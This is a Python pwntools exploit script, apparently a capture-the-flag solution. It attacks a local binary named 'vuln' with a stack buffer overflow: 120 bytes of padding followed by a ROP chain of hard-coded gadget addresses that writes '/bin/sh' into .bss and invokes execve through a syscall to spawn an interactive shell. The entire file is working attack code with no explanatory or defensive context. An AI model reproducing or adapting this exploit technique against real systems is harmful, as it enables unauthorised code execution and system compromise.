#!/usr/bin/python3
from pwn import process, p64

shell = process("./vuln")

offset = 120
junk = b"A" * offset

bss = p64(0x006bc3a0)
execve = p64(0x3b)
syscall = p64(0x40137c)

mov_rdi_rsi = p64(0x447d7b)
pop_rdi = p64(0x400696)
pop_rsi = p64(0x410ca3)
pop_rdx = p64(0x44cc26)
pop_rax = p64(0x4163f4)

payload  = b""
payload += junk
payload += pop_rdi + bss
payload += pop_rsi + b"/bin/sh\x00"
payload += mov_rdi_rsi
payload += pop_rdi + bss
payload += pop_rsi + p64(0)
payload += pop_rdx + p64(0)
payload += pop_rax + execve
payload += syscall

shell.sendlineafter(b" guess?", b"84")
shell.sendlineafter(b"Name? ", payload)

shell.recv()
shell.interactive()
